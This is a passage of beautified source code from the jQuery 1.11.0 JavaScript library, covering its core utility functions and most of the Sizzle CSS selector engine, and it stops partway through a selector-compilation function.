!function(e, t) {
    "object" == typeof module && "object" == typeof module.exports ? module.exports = e.document ? t(e, !0) : function(e) {
        if (!e.document)
            throw new Error("jQuery requires a window with a document");
        return t(e)
    }
    : t(e)
}("undefined" != typeof window ? window : this, function(f, e) {
    function t(e, t) {
        return t.toUpperCase()
    }
    var c = []
      , u = c.slice
      , p = c.concat
      , o = c.push
      , a = c.indexOf
      , n = {}
      , i = n.toString
      , _ = n.hasOwnProperty
      , s = "".trim
      , g = {}
      , r = "1.11.0"
      , k = function(e, t) {
        return new k.fn.init(e,t)
    }
      , l = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g
      , d = /^-ms-/
      , h = /-([\da-z])/gi;
    function m(e) {
        var t = e.length
          , n = k.type(e);
        return "function" !== n && !k.isWindow(e) && (!(1 !== e.nodeType || !t) || ("array" === n || 0 === t || "number" == typeof t && 0 < t && t - 1 in e))
    }
    k.fn = k.prototype = {
        jquery: r,
        constructor: k,
        selector: "",
        length: 0,
        toArray: function() {
            return u.call(this)
        },
        get: function(e) {
            return null != e ? e < 0 ? this[e + this.length] : this[e] : u.call(this)
        },
        pushStack: function(e) {
            var t = k.merge(this.constructor(), e);
            return t.prevObject = this,
            t.context = this.context,
            t
        },
        each: function(e, t) {
            return k.each(this, e, t)
        },
        map: function(n) {
            return this.pushStack(k.map(this, function(e, t) {
                return n.call(e, t, e)
            }))
        },
        slice: function() {
            return this.pushStack(u.apply(this, arguments))
        },
        first: function() {
            return this.eq(0)
        },
        last: function() {
            return this.eq(-1)
        },
        eq: function(e) {
            var t = this.length
              , n = +e + (e < 0 ? t : 0);
            return this.pushStack(0 <= n && n < t ? [this[n]] : [])
        },
        end: function() {
            return this.prevObject || this.constructor(null)
        },
        push: o,
        sort: c.sort,
        splice: c.splice
    },
    k.extend = k.fn.extend = function() {
        var e, t, n, i, a, s, r = arguments[0] || {}, o = 1, l = arguments.length, d = !1;
        for ("boolean" == typeof r && (d = r,
        r = arguments[o] || {},
        o++),
        "object" == typeof r || k.isFunction(r) || (r = {}),
        o === l && (r = this,
        o--); o < l; o++)
            if (null != (a = arguments[o]))
                for (i in a)
                    e = r[i],
                    r !== (n = a[i]) && (d && n && (k.isPlainObject(n) || (t = k.isArray(n))) ? (s = t ? (t = !1,
                    e && k.isArray(e) ? e : []) : e && k.isPlainObject(e) ? e : {},
                    r[i] = k.extend(d, s, n)) : void 0 !== n && (r[i] = n));
        return r
    }
    ,
    k.extend({
        expando: "jQuery" + (r + Math.random()).replace(/\D/g, ""),
        isReady: !0,
        error: function(e) {
            throw new Error(e)
        },
        noop: function() {},
        isFunction: function(e) {
            return "function" === k.type(e)
        },
        isArray: Array.isArray || function(e) {
            return "array" === k.type(e)
        }
        ,
        isWindow: function(e) {
            return null != e && e == e.window
        },
        isNumeric: function(e) {
            return 0 <= e - parseFloat(e)
        },
        isEmptyObject: function(e) {
            var t;
            for (t in e)
                return !1;
            return !0
        },
        isPlainObject: function(e) {
            var t;
            if (!e || "object" !== k.type(e) || e.nodeType || k.isWindow(e))
                return !1;
            try {
                if (e.constructor && !_.call(e, "constructor") && !_.call(e.constructor.prototype, "isPrototypeOf"))
                    return !1
            } catch (e) {
                return !1
            }
            if (g.ownLast)
                for (t in e)
                    return _.call(e, t);
            for (t in e)
                ;
            return void 0 === t || _.call(e, t)
        },
        type: function(e) {
            return null == e ? e + "" : "object" == typeof e || "function" == typeof e ? n[i.call(e)] || "object" : typeof e
        },
        globalEval: function(e) {
            e && k.trim(e) && (f.execScript || function(e) {
                f.eval.call(f, e)
            }
            )(e)
        },
        camelCase: function(e) {
            return e.replace(d, "ms-").replace(h, t)
        },
        nodeName: function(e, t) {
            return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase()
        },
        each: function(e, t, n) {
            var i = 0
              , a = e.length
              , s = m(e);
            if (n) {
                if (s)
                    for (; i < a && !1 !== t.apply(e[i], n); i++)
                        ;
                else
                    for (i in e)
                        if (!1 === t.apply(e[i], n))
                            break
            } else if (s)
                for (; i < a && !1 !== t.call(e[i], i, e[i]); i++)
                    ;
            else
                for (i in e)
                    if (!1 === t.call(e[i], i, e[i]))
                        break;
            return e
        },
        trim: s && !s.call("\ufeff ") ? function(e) {
            return null == e ? "" : s.call(e)
        }
        : function(e) {
            return null == e ? "" : (e + "").replace(l, "")
        }
        ,
        makeArray: function(e, t) {
            var n = t || [];
            return null != e && (m(Object(e)) ? k.merge(n, "string" == typeof e ? [e] : e) : o.call(n, e)),
            n
        },
        inArray: function(e, t, n) {
            var i;
            if (t) {
                if (a)
                    return a.call(t, e, n);
                for (i = t.length,
                n = n ? n < 0 ? Math.max(0, i + n) : n : 0; n < i; n++)
                    if (n in t && t[n] === e)
                        return n
            }
            return -1
        },
        merge: function(e, t) {
            for (var n = +t.length, i = 0, a = e.length; i < n; )
                e[a++] = t[i++];
            if (n != n)
                for (; void 0 !== t[i]; )
                    e[a++] = t[i++];
            return e.length = a,
            e
        },
        grep: function(e, t, n) {
            for (var i = [], a = 0, s = e.length, r = !n; a < s; a++)
                !t(e[a], a) != r && i.push(e[a]);
            return i
        },
        map: function(e, t, n) {
            var i, a = 0, s = e.length, r = [];
            if (m(e))
                for (; a < s; a++)
                    null != (i = t(e[a], a, n)) && r.push(i);
            else
                for (a in e)
                    null != (i = t(e[a], a, n)) && r.push(i);
            return p.apply([], r)
        },
        guid: 1,
        proxy: function(e, t) {
            var n, i, a;
            return "string" == typeof t && (a = e[t],
            t = e,
            e = a),
            k.isFunction(e) ? (n = u.call(arguments, 2),
            (i = function() {
                return e.apply(t || this, n.concat(u.call(arguments)))
            }
            ).guid = e.guid = e.guid || k.guid++,
            i) : void 0
        },
        now: function() {
            return +new Date
        },
        support: g
    }),
    k.each("Boolean Number String Function Array Date RegExp Object Error".split(" "), function(e, t) {
        n["[object " + t + "]"] = t.toLowerCase()
    });
    var y = function(n) {
        var e, f, M, s, i, p, L, d, u, _, b, a, g, y, r, o, v, k = "sizzle" + -new Date, D = n.document, Y = 0, c = 0, l = ne(), h = ne(), m = ne(), w = function(e, t) {
            return e === t && (u = !0),
            0
        }, T = "undefined", S = {}.hasOwnProperty, t = [], x = t.pop, H = t.push, E = t.push, j = t.slice, C = t.indexOf || function(e) {
            for (var t = 0, n = this.length; t < n; t++)
                if (this[t] === e)
                    return t;
            return -1
        }
        , A = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped", P = "[\\x20\\t\\r\\n\\f]", O = "(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+", N = O.replace("w", "w#"), F = "\\[" + P + "*(" + O + ")" + P + "*(?:([*^$|!~]?=)" + P + "*(?:(['\"])((?:\\\\.|[^\\\\])*?)\\3|(" + N + ")|)|)" + P + "*\\]", W = ":(" + O + ")(?:\\(((['\"])((?:\\\\.|[^\\\\])*?)\\3|((?:\\\\.|[^\\\\()[\\]]|" + F.replace(3, 8) + ")*)|.*)\\)|)", I = new RegExp("^" + P + "+|((?:^|[^\\\\])(?:\\\\.)*)" + P + "+$","g"), z = new RegExp("^" + P + "*," + P + "*"), R = new RegExp("^" + P + "*([>+~]|" + P + ")" + P + "*"), $ = new RegExp("=" + P + "*([^\\]'\"]*?)" + P + "*\\]","g"), B = new RegExp(W), q = new RegExp("^" + N + "$"), U = {
            ID: new RegExp("^#(" + O + ")"),
            CLASS: new RegExp("^\\.(" + O + ")"),
            TAG: new RegExp("^(" + O.replace("w", "w*") + ")"),
            ATTR: new RegExp("^" + F),
            PSEUDO: new RegExp("^" + W),
            CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + P + "*(even|odd|(([+-]|)(\\d*)n|)" + P + "*(?:([+-]|)" + P + "*(\\d+)|))" + P + "*\\)|)","i"),
            bool: new RegExp("^(?:" + A + ")$","i"),
            needsContext: new RegExp("^" + P + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + P + "*((?:-\\d)?\\d*)" + P + "*\\)|)(?=[^-]|$)","i")
        }, J = /^(?:input|select|textarea|button)$/i, V = /^h\d$/i, G = /^[^{]+\{\s*\[native \w/, X = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/, K = /[+~]/, Q = /'|\\/g, Z = new RegExp("\\\\([\\da-f]{1,6}" + P + "?|(" + P + ")|.)","ig"), ee = function(e, t, n) {
            var i = "0x" + t - 65536;
            return i != i || n ? t : i < 0 ? String.fromCharCode(65536 + i) : String.fromCharCode(i >> 10 | 55296, 1023 & i | 56320)
        };
        try {
            E.apply(t = j.call(D.childNodes), D.childNodes),
            t[D.childNodes.length].nodeType
        } catch (e) {
            E = {
                apply: t.length ? function(e, t) {
                    H.apply(e, j.call(t))
                }
                : function(e, t) {
                    for (var n = e.length, i = 0; e[n++] = t[i++]; )
                        ;
                    e.length = n - 1
                }
            }
        }
        function te(e, t, n, i) {
            var a, s, r, o, l, d, u, c, h, m;
            if ((t ? t.ownerDocument || t : D) !== b && _(t),
            n = n || [],
            !e || "string" != typeof e)
                return n;
            if (1 !== (o = (t = t || b).nodeType) && 9 !== o)
                return [];
            if (g && !i) {
                if (a = X.exec(e))
                    if (r = a[1]) {
                        if (9 === o) {
                            if (!(s = t.getElementById(r)) || !s.parentNode)
                                return n;
                            if (s.id === r)
                                return n.push(s),
                                n
                        } else if (t.ownerDocument && (s = t.ownerDocument.getElementById(r)) && v(t, s) && s.id === r)
                            return n.push(s),
                            n
                    } else {
                        if (a[2])
                            return E.apply(n, t.getElementsByTagName(e)),
                            n;
                        if ((r = a[3]) && f.getElementsByClassName && t.getElementsByClassName)
                            return E.apply(n, t.getElementsByClassName(r)),
                            n
                    }
                if (f.qsa && (!y || !y.test(e))) {
                    if (c = u = k,
                    h = t,
                    m = 9 === o && e,
                    1 === o && "object" !== t.nodeName.toLowerCase()) {
                        for (d = he(e),
                        (u = t.getAttribute("id")) ? c = u.replace(Q, "\\$&") : t.setAttribute("id", c),
                        c = "[id='" + c + "'] ",
                        l = d.length; l--; )
                            d[l] = c + me(d[l]);
                        h = K.test(e) && ue(t.parentNode) || t,
                        m = d.join(",")
                    }
                    if (m)
                        try {
                            return E.apply(n, h.querySelectorAll(m)),
                            n
                        } catch (e) {} finally {
                            u || t.removeAttribute("id")
                        }
                }
            }
            return function(e, t, n, i) {
                var a, s, r, o, l, d = he(e);
                if (!i && 1 === d.length) {
                    if (2 < (s = d[0] = d[0].slice(0)).length && "ID" === (r = s[0]).type && f.getById && 9 === t.nodeType && g && M.relative[s[1].type]) {
                        if (!(t = (M.find.ID(r.matches[0].replace(Z, ee), t) || [])[0]))
                            return n;
                        e = e.slice(s.shift().value.length)
                    }
                    for (a = U.needsContext.test(e) ? 0 : s.length; a-- && (r = s[a],
                    !M.relative[o = r.type]); )
                        if ((l = M.find[o]) && (i = l(r.matches[0].replace(Z, ee), K.test(s[0].type) && ue(t.parentNode) || t))) {
                            if (s.splice(a, 1),
                            !(e = i.length && me(s)))
                                return E.apply(n, i),
                                n;
                            break
                        }
                }
                return p(e, d)(i, t, !g, n, K.test(e) && ue(t.parentNode) || t),
                n
            }(e.replace(I, "$1"), t, n, i)
        }
        function ne() {
            var i = [];
            return function e(t, n) {
                return i.push(t + " ") > M.cacheLength && delete e[i.shift()],
                e[t + " "] = n
            }
        }
        function ie(e) {
            return e[k] = !0,
            e
        }
        function ae(e) {
            var t = b.createElement("div");
            try {
                return !!e(t)
            } catch (e) {
                return !1
            } finally {
                t.parentNode && t.parentNode.removeChild(t),
                t = null
            }
        }
        function se(e, t) {
            for (var n = e.split("|"), i = e.length; i--; )
                M.attrHandle[n[i]] = t
        }
        function re(e, t) {
            var n = t && e
              , i = n && 1 === e.nodeType && 1 === t.nodeType && (~t.sourceIndex || 1 << 31) - (~e.sourceIndex || 1 << 31);
            if (i)
                return i;
            if (n)
                for (; n = n.nextSibling; )
                    if (n === t)
                        return -1;
            return e ? 1 : -1
        }
        function oe(t) {
            return function(e) {
                return "input" === e.nodeName.toLowerCase() && e.type === t
            }
        }
        function le(n) {
            return function(e) {
                var t = e.nodeName.toLowerCase();
                return ("input" === t || "button" === t) && e.type === n
            }
        }
        function de(r) {
            return ie(function(s) {
                return s = +s,
                ie(function(e, t) {
                    for (var n, i = r([], e.length, s), a = i.length; a--; )
                        e[n = i[a]] && (e[n] = !(t[n] = e[n]))
                })
            })
        }
        function ue(e) {
            return e && typeof e.getElementsByTagName !== T && e
        }
        for (e in f = te.support = {},
        i = te.isXML = function(e) {
            var t = e && (e.ownerDocument || e).documentElement;
            return !!t && "HTML" !== t.nodeName
        }
        ,
        _ = te.setDocument = function(e) {
            var t, l = e ? e.ownerDocument || e : D, n = l.defaultView;
            return l !== b && 9 === l.nodeType && l.documentElement ? (a = (b = l).documentElement,
            g = !i(l),
            n && n !== n.top && (n.addEventListener ? n.addEventListener("unload", function() {
                _()
            }, !1) : n.attachEvent && n.attachEvent("onunload", function() {
                _()
            })),
            f.attributes = ae(function(e) {
                return e.className = "i",
                !e.getAttribute("className")
            }),
            f.getElementsByTagName = ae(function(e) {
                return e.appendChild(l.createComment("")),
                !e.getElementsByTagName("*").length
            }),
            f.getElementsByClassName = G.test(l.getElementsByClassName) && ae(function(e) {
                return e.innerHTML = "<div class='a'></div><div class='a i'></div>",
                e.firstChild.className = "i",
                2 === e.getElementsByClassName("i").length
            }),
            f.getById = ae(function(e) {
                return a.appendChild(e).id = k,
                !l.getElementsByName || !l.getElementsByName(k).length
            }),
            f.getById ? (M.find.ID = function(e, t) {
                if (typeof t.getElementById !== T && g) {
                    var n = t.getElementById(e);
                    return n && n.parentNode ? [n] : []
                }
            }
            ,
            M.filter.ID = function(e) {
                var t = e.replace(Z, ee);
                return function(e) {
                    return e.getAttribute("id") === t
                }
            }
            ) : (delete M.find.ID,
            M.filter.ID = function(e) {
                var n = e.replace(Z, ee);
                return function(e) {
                    var t = typeof e.getAttributeNode !== T && e.getAttributeNode("id");
                    return t && t.value === n
                }
            }
            ),
            M.find.TAG = f.getElementsByTagName ? function(e, t) {
                return typeof t.getElementsByTagName !== T ? t.getElementsByTagName(e) : void 0
            }
            : function(e, t) {
                var n, i = [], a = 0, s = t.getElementsByTagName(e);
                if ("*" !== e)
                    return s;
                for (; n = s[a++]; )
                    1 === n.nodeType && i.push(n);
                return i
            }
            ,
            M.find.CLASS = f.getElementsByClassName && function(e, t) {
                return typeof t.getElementsByClassName !== T && g ? t.getElementsByClassName(e) : void 0
            }
            ,
            r = [],
            y = [],
            (f.qsa = G.test(l.querySelectorAll)) && (ae(function(e) {
                e.innerHTML = "<select t=''><option selected=''></option></select>",
                e.querySelectorAll("[t^='']").length && y.push("[*^$]=" + P + "*(?:''|\"\")"),
                e.querySelectorAll("[selected]").length || y.push("\\[" + P + "*(?:value|" + A + ")"),
                e.querySelectorAll(":checked").length || y.push(":checked")
            }),
            ae(function(e) {
                var t = l.createElement("input");
                t.setAttribute("type", "hidden"),
                e.appendChild(t).setAttribute("name", "D"),
                e.querySelectorAll("[name=d]").length && y.push("name" + P + "*[*^$|!~]?="),
                e.querySelectorAll(":enabled").length || y.push(":enabled", ":disabled"),
                e.querySelectorAll("*,:x"),
                y.push(",.*:")
            })),
            (f.matchesSelector = G.test(o = a.webkitMatchesSelector || a.mozMatchesSelector || a.oMatchesSelector || a.msMatchesSelector)) && ae(function(e) {
                f.disconnectedMatch = o.call(e, "div"),
                o.call(e, "[s!='']:x"),
                r.push("!=", W)
            }),
            y = y.length && new RegExp(y.join("|")),
            r = r.length && new RegExp(r.join("|")),
            t = G.test(a.compareDocumentPosition),
            v = t || G.test(a.contains) ? function(e, t) {
                var n = 9 === e.nodeType ? e.documentElement : e
                  , i = t && t.parentNode;
                return e === i || !(!i || 1 !== i.nodeType || !(n.contains ? n.contains(i) : e.compareDocumentPosition && 16 & e.compareDocumentPosition(i)))
            }
            : function(e, t) {
                if (t)
                    for (; t = t.parentNode; )
                        if (t === e)
                            return !0;
                return !1
            }
            ,
            w = t ? function(e, t) {
                if (e === t)
                    return u = !0,
                    0;
                var n = !e.compareDocumentPosition - !t.compareDocumentPosition;
                return n || (1 & (n = (e.ownerDocument || e) === (t.ownerDocument || t) ? e.compareDocumentPosition(t) : 1) || !f.sortDetached && t.compareDocumentPosition(e) === n ? e === l || e.ownerDocument === D && v(D, e) ? -1 : t === l || t.ownerDocument === D && v(D, t) ? 1 : d ? C.call(d, e) - C.call(d, t) : 0 : 4 & n ? -1 : 1)
            }
            : function(e, t) {
                if (e === t)
                    return u = !0,
                    0;
                var n, i = 0, a = e.parentNode, s = t.parentNode, r = [e], o = [t];
                if (!a || !s)
                    return e === l ? -1 : t === l ? 1 : a ? -1 : s ? 1 : d ? C.call(d, e) - C.call(d, t) : 0;
                if (a === s)
                    return re(e, t);
                for (n = e; n = n.parentNode; )
                    r.unshift(n);
                for (n = t; n = n.parentNode; )
                    o.unshift(n);
                for (; r[i] === o[i]; )
                    i++;
                return i ? re(r[i], o[i]) : r[i] === D ? -1 : o[i] === D ? 1 : 0
            }
            ,
            l) : b
        }
        ,
        te.matches = function(e, t) {
            return te(e, null, null, t)
        }
        ,
        te.matchesSelector = function(e, t) {
            if ((e.ownerDocument || e) !== b && _(e),
            t = t.replace($, "='$1']"),
            !(!f.matchesSelector || !g || r && r.test(t) || y && y.test(t)))
                try {
                    var n = o.call(e, t);
                    if (n || f.disconnectedMatch || e.document && 11 !== e.document.nodeType)
                        return n
                } catch (e) {}
            return 0 < te(t, b, null, [e]).length
        }
        ,
        te.contains = function(e, t) {
            return (e.ownerDocument || e) !== b && _(e),
            v(e, t)
        }
        ,
        te.attr = function(e, t) {
            (e.ownerDocument || e) !== b && _(e);
            var n = M.attrHandle[t.toLowerCase()]
              , i = n && S.call(M.attrHandle, t.toLowerCase()) ? n(e, t, !g) : void 0;
            return void 0 !== i ? i : f.attributes || !g ? e.getAttribute(t) : (i = e.getAttributeNode(t)) && i.specified ? i.value : null
        }
        ,
        te.error = function(e) {
            throw new Error("Syntax error, unrecognized expression: " + e)
        }
        ,
        te.uniqueSort = function(e) {
            var t, n = [], i = 0, a = 0;
            if (u = !f.detectDuplicates,
            d = !f.sortStable && e.slice(0),
            e.sort(w),
            u) {
                for (; t = e[a++]; )
                    t === e[a] && (i = n.push(a));
                for (; i--; )
                    e.splice(n[i], 1)
            }
            return d = null,
            e
        }
        ,
        s = te.getText = function(e) {
            var t, n = "", i = 0, a = e.nodeType;
            if (a) {
                if (1 === a || 9 === a || 11 === a) {
                    if ("string" == typeof e.textContent)
                        return e.textContent;
                    for (e = e.firstChild; e; e = e.nextSibling)
                        n += s(e)
                } else if (3 === a || 4 === a)
                    return e.nodeValue
            } else
                for (; t = e[i++]; )
                    n += s(t);
            return n
        }
        ,
        (M = te.selectors = {
            cacheLength: 50,
            createPseudo: ie,
            match: U,
            attrHandle: {},
            find: {},
            relative: {
                ">": {
                    dir: "parentNode",
                    first: !0
                },
                " ": {
                    dir: "parentNode"
                },
                "+": {
                    dir: "previousSibling",
                    first: !0
                },
                "~": {
                    dir: "previousSibling"
                }
            },
            preFilter: {
                ATTR: function(e) {
                    return e[1] = e[1].replace(Z, ee),
                    e[3] = (e[4] || e[5] || "").replace(Z, ee),
                    "~=" === e[2] && (e[3] = " " + e[3] + " "),
                    e.slice(0, 4)
                },
                CHILD: function(e) {
                    return e[1] = e[1].toLowerCase(),
                    "nth" === e[1].slice(0, 3) ? (e[3] || te.error(e[0]),
                    e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * ("even" === e[3] || "odd" === e[3])),
                    e[5] = +(e[7] + e[8] || "odd" === e[3])) : e[3] && te.error(e[0]),
                    e
                },
                PSEUDO: function(e) {
                    var t, n = !e[5] && e[2];
                    return U.CHILD.test(e[0]) ? null : (e[3] && void 0 !== e[4] ? e[2] = e[4] : n && B.test(n) && (t = he(n, !0)) && (t = n.indexOf(")", n.length - t) - n.length) && (e[0] = e[0].slice(0, t),
                    e[2] = n.slice(0, t)),
                    e.slice(0, 3))
                }
            },
            filter: {
                TAG: function(e) {
                    var t = e.replace(Z, ee).toLowerCase();
                    return "*" === e ? function() {
                        return !0
                    }
                    : function(e) {
                        return e.nodeName && e.nodeName.toLowerCase() === t
                    }
                },
                CLASS: function(e) {
                    var t = l[e + " "];
                    return t || (t = new RegExp("(^|" + P + ")" + e + "(" + P + "|$)")) && l(e, function(e) {
                        return t.test("string" == typeof e.className && e.className || typeof e.getAttribute !== T && e.getAttribute("class") || "")
                    })
                },
                ATTR: function(n, i, a) {
                    return function(e) {
                        var t = te.attr(e, n);
                        return null == t ? "!=" === i : !i || (t += "",
                        "=" === i ? t === a : "!=" === i ? t !== a : "^=" === i ? a && 0 === t.indexOf(a) : "*=" === i ? a && -1 < t.indexOf(a) : "$=" === i ? a && t.slice(-a.length) === a : "~=" === i ? -1 < (" " + t + " ").indexOf(a) : "|=" === i && (t === a || t.slice(0, a.length + 1) === a + "-"))
                    }
                },
                CHILD: function(m, e, t, f, p) {
                    var _ = "nth" !== m.slice(0, 3)
                      , g = "last" !== m.slice(-4)
                      , y = "of-type" === e;
                    return 1 === f && 0 === p ? function(e) {
                        return !!e.parentNode
                    }
                    : function(e, t, n) {
                        var i, a, s, r, o, l, d = _ != g ? "nextSibling" : "previousSibling", u = e.parentNode, c = y && e.nodeName.toLowerCase(), h = !n && !y;
                        if (u) {
                            if (_) {
                                for (; d; ) {
                                    for (s = e; s = s[d]; )
                                        if (y ? s.nodeName.toLowerCase() === c : 1 === s.nodeType)
                                            return !1;
                                    l = d = "only" === m && !l && "nextSibling"
                                }
                                return !0
                            }
                            if (l = [g ? u.firstChild : u.lastChild],
                            g && h) {
                                for (o = (i = (a = u[k] || (u[k] = {}))[m] || [])[0] === Y && i[1],
                                r = i[0] === Y && i[2],
                                s = o && u.childNodes[o]; s = ++o && s && s[d] || (r = o = 0) || l.pop(); )
                                    if (1 === s.nodeType && ++r && s === e) {
                                        a[m] = [Y, o, r];
                                        break
                                    }
                            } else if (h && (i = (e[k] || (e[k] = {}))[m]) && i[0] === Y)
                                r = i[1];
                            else
                                for (; (s = ++o && s && s[d] || (r = o = 0) || l.pop()) && ((y ? s.nodeName.toLowerCase() !== c : 1 !== s.nodeType) || !++r || (h && ((s[k] || (s[k] = {}))[m] = [Y, r]),
                                s !== e)); )
                                    ;
                            return (r -= p) === f || r % f == 0 && 0 <= r / f
                        }
                    }
                },
                PSEUDO: function(e, s) {
                    var t, r = M.pseudos[e] || M.setFilters[e.toLowerCase()] || te.error("unsupported pseudo: " + e);
                    return r[k] ? r(s) : 1 < r.length ? (t = [e, e, "", s],
                    M.setFilters.hasOwnProperty(e.toLowerCase()) ? ie(function(e, t) {
                        for (var n, i = r(e, s), a = i.length; a--; )
                            e[n = C.call(e, i[a])] = !(t[n] = i[a])
                    }) : function(e) {
                        return r(e, 0, t)
                    }
                    ) : r
                }
            },
            pseudos: {
                not: ie(function(e) {
                    var i = []
                      , a = []
                      , o = p(e.replace(I, "$1"));
                    return o[k] ? ie(function(e, t, n, i) {
                        for (var a, s = o(e, null, i, []), r = e.length; r--; )
                            (a = s[r]) && (e[r] = !(t[r] = a))
                    }) : function(e, t, n) {
                        return i[0] = e,
                        o(i, null, n, a),
                        !a.pop()
                    }
                }),
                has: ie(function(t) {
                    return function(e) {
                        return 0 < te(t, e).length
                    }
                }),
                contains: ie(function(t) {
                    return function(e) {
                        return -1 < (e.textContent || e.innerText || s(e)).indexOf(t)
                    }
                }),
                lang: ie(function(n) {
                    return q.test(n || "") || te.error("unsupported lang: " + n),
                    n = n.replace(Z, ee).toLowerCase(),
                    function(e) {
                        var t;
                        do {
                            if (t = g ? e.lang : e.getAttribute("xml:lang") || e.getAttribute("lang"))
                                return (t = t.toLowerCase()) === n || 0 === t.indexOf(n + "-")
                        } while ((e = e.parentNode) && 1 === e.nodeType);return !1
                    }
                }),
                target: function(e) {
                    var t = n.location && n.location.hash;
                    return t && t.slice(1) === e.id
                },
                root: function(e) {
                    return e === a
                },
                focus: function(e) {
                    return e === b.activeElement && (!b.hasFocus || b.hasFocus()) && !!(e.type || e.href || ~e.tabIndex)
                },
                enabled: function(e) {
                    return !1 === e.disabled
                },
                disabled: function(e) {
                    return !0 === e.disabled
                },
                checked: function(e) {
                    var t = e.nodeName.toLowerCase();
                    return "input" === t && !!e.checked || "option" === t && !!e.selected
                },
                selected: function(e) {
                    return e.parentNode && e.parentNode.selectedIndex,
                    !0 === e.selected
                },
                empty: function(e) {
                    for (e = e.firstChild; e; e = e.nextSibling)
                        if (e.nodeType < 6)
                            return !1;
                    return !0
                },
                parent: function(e) {
                    return !M.pseudos.empty(e)
                },
                header: function(e) {
                    return V.test(e.nodeName)
                },
                input: function(e) {
                    return J.test(e.nodeName)
                },
                button: function(e) {
                    var t = e.nodeName.toLowerCase();
                    return "input" === t && "button" === e.type || "button" === t
                },
                text: function(e) {
                    var t;
                    return "input" === e.nodeName.toLowerCase() && "text" === e.type && (null == (t = e.getAttribute("type")) || "text" === t.toLowerCase())
                },
                first: de(function() {
                    return [0]
                }),
                last: de(function(e, t) {
                    return [t - 1]
                }),
                eq: de(function(e, t, n) {
                    return [n < 0 ? n + t : n]
                }),
                even: de(function(e, t) {
                    for (var n = 0; n < t; n += 2)
                        e.push(n);
                    return e
                }),
                odd: de(function(e, t) {
                    for (var n = 1; n < t; n += 2)
                        e.push(n);
                    return e
                }),
                lt: de(function(e, t, n) {
                    for (var i = n < 0 ? n + t : n; 0 <= --i; )
                        e.push(i);
                    return e
                }),
                gt: de(function(e, t, n) {
                    for (var i = n < 0 ? n + t : n; ++i < t; )
                        e.push(i);
                    return e
                })
            }
        }).pseudos.nth = M.pseudos.eq,
        {
            radio: !0,
            checkbox: !0,
            file: !0,
            password: !0,
            image: !0
        })
            M.pseudos[e] = oe(e);
        for (e in {
            submit: !0,
            reset: !0
        })
            M.pseudos[e] = le(e);
        function ce() {}
        function he(e, t) {
            var n, i, a, s, r, o, l, d = h[e + " "];
            if (d)
                return t ? 0 : d.slice(0);
            for (r = e,
            o = [],
            l = M.preFilter; r; ) {
                for (s in n && !(i = z.exec(r)) || (i && (r = r.slice(i[0].length) || r),
                o.push(a = [])),
                n = !1,
                (i = R.exec(r)) && (n = i.shift(),
                a.push({
                    value: n,
                    type: i[0].replace(I, " ")
                }),
                r = r.slice(n.length)),
                M.filter)
                    !(i = U[s].exec(r)) || l[s] && !(i = l[s](i)) || (n = i.shift(),
                    a.push({
                        value: n,
                        type: s,
                        matches: i
                    }),
                    r = r.slice(n.length));
                if (!n)
                    break
            }
            return t ? r.length : r ? te.error(e) : h(e, o).slice(0)
        }
        function me(e) {
            for (var t = 0, n = e.length, i = ""; t < n; t++)
                i += e[t].value;
            return i
        }
        function fe(r, e, t) {
            var o = e.dir
              , l = t && "parentNode" === o
              , d = c++;
            return e.first ? function(e, t, n) {
                for (; e = e[o]; )
                    if (1 === e.nodeType || l)
                        return r(e, t, n)
            }
            : function(e, t, n) {
                var i, a, s = [Y, d];
                if (n) {
                    for (; e = e[o]; )
                        if ((1 === e.nodeType || l) && r(e, t, n))
                            return !0
                } else
                    for (; e = e[o]; )
                        if (1 === e.nodeType || l) {
                            if ((i = (a = e[k] || (e[k] = {}))[o]) && i[0] === Y && i[1] === d)
                                return s[2] = i[2];
                            if ((a[o] = s)[2] = r(e, t, n))
                                return !0
                        }
            }
        }
        function pe(a) {
            return 1 < a.length ? function(e, t, n) {
                for (var i = a.length; i--; )
                    if (!a[i](e, t, n))
                        return !1;
                return !0
            }
            : a[0]
        }
        function _e(e, t, n, i, a) {
            for (var s, r = [], o = 0, l = e.length, d = null != t; o < l; o++)
                !(s = e[o]) || n && !n(s, i, a) || (r.push(s),
                d && t.push(o));
            return r
        }
        function ge(m, f, p, _, g, e) {
            return _ && !_[k] && (_ = ge(_)),
            g && !g[k] && (g = ge(g, e)),
            ie(function(e, t, n, i) {
                var a, s, r, o = [], l = [], d = t.length, u = e || function(e, t, n) {
                    for (var i = 0, a = t.length; i < a; i++)
                        te(e, t[i], n);
                    return n
                }(f || "*", n.nodeType ? [n] : n, []), c = !m || !e && f ? u : _e(u, o, m, n, i), h = p ? g || (e ? m : d || _) ? [] : t : c;
                if (p && p(c, h, n, i),
                _)
                    for (a = _e(h, l),
                    _(a, [], n, i),
                    s = a.length; s--; )
                        (r = a[s]) && (h[l[s]] = !(c[l[s]] = r));
                if (e) {
                    if (g || m) {
                        if (g) {
                            for (a = [],
                            s = h.length; s--; )
                                (r = h[s]) && a.push(c[s] = r);
                            g(null, h = [], a, i)
                        }
                        for (s = h.length; s--; )
                            (r = h[s]) && -1 < (a = g ? C.call(e, r) : o[s]) && (e[a] = !(t[a] = r))
                    }
                } else
                    h = _e(h === t ? h.splice(d, h.length) : h),
                    g ? g(null, t, h, i) : E.apply(t, h)
            })
        }
        function ye(e) {
            for (var i, t, n, a = e.length, s = M.relative[e[0].type], r = s || M.relative[" "], o = s ? 1 : 0, l = fe(function(e) {
                return e === i
            }, r, !0), d = fe(function(e) {
                return -1 < C.call(i, e)
            }, r, !0), u = [function(e, t, n) {
                return !s && (n || t !== L) || ((i = t).nodeType ? l : d)(e, t, n)
            }
            ]; o < a; o++)
                if (t = M.relative[e[o].type])
                    u = [fe(pe(u), t)];
                else {
                    if ((t = M.filter[e[o].type].apply(null, e[o].matches))[k]) {
                        for (n = ++o; n < a && !M.relative[e[n].type]; n++)
                            ;
                        return ge(1 < o && pe(u), 1 < o && me(e.slice(0, o - 1).concat({
                            value: " " === e[o - 2].type ? "*" : ""
                        })).replace(I, "$1"), t, o < n && ye(e.slice(o, n)), n < a && ye(e = e.slice(n)), n < a && me(e))
